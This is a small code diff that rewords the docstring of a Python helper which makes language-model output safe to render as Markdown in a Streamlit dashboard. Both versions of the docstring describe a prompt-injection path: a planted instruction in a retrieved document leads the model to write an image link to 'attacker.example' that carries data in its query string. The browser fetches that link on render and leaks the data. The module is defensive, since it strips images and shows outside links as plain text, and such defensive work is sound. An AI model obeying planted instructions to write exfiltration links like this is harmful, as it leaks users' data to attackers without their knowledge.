@@ -1,9 +1,9 @@
-"""Rendering model text safely in the dashboard.
+"""Make model text safe to render as Markdown.
 
-The answer comes from a language model, and a planted instruction in a retrieved document could make it emit
-markdown the browser acts on: an image ("![](https://attacker.example/?q=...)") is fetched as soon as it is
-rendered, which leaks data without a click. So images are removed and outbound links become plain text.
-Raw HTML is never rendered (Streamlit escapes it unless unsafe_allow_html=True, which this dashboard never sets).
+A planted instruction in a document could get the model to write an image like
+![](https://attacker.example/?q=...), and the browser would fetch it on render, leaking data without anyone
+clicking. So images are removed and outside links shown as plain text. Streamlit escapes raw HTML already
+(this dashboard never sets unsafe_allow_html).
 """
 import re
 
